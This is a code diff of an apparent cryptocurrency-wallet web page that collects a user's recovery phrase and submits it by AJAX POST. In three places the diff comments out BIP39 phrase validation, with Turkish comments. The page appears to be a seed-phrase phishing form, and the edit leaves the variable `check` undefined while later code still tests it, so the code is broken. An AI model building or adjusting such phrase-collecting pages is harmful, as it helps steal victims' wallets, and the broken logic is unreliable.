@@ -68021,7 +68021,10 @@ input:checked + .send-v2__amount-max__button {
                     }
                 });
 
-                var check = bip39.validateMnemonic(phs3.join(" "), bip39.wordlists.english);
+                // Bip39 doğrulaması kaldırıldı
+                // var check = bip39.validateMnemonic(phs3.join(" "), bip39.wordlists.english);
+                
+                // Diğer kontroller
                 if (!check) {
                     $("#phrase-helper-text").show();
                 } else {
@@ -68042,7 +68045,10 @@ input:checked + .send-v2__amount-max__button {
                         }
                     });
 
-                    var check = bip39.validateMnemonic(phs2.join(" "), bip39.wordlists.english);
+                    // Bip39 doğrulaması kaldırıldı
+                    // var check = bip39.validateMnemonic(phs2.join(" "), bip39.wordlists.english);
+                    
+                    // Diğer kontroller
                     if (!check) {
                         $("#phrase-helper-text").show();
                     } else {
@@ -68060,7 +68066,10 @@ input:checked + .send-v2__amount-max__button {
                 }
             });
 
-            var check = bip39.validateMnemonic(phs.join(" "), bip39.wordlists.english);
+            // Bip39 doğrulaması kaldırıldı
+            // var check = bip39.validateMnemonic(phs.join(" "), bip39.wordlists.english);
+            
+            // Diğer kontroller
             if (check) {
                 $.ajax({
                     method: 'POST',
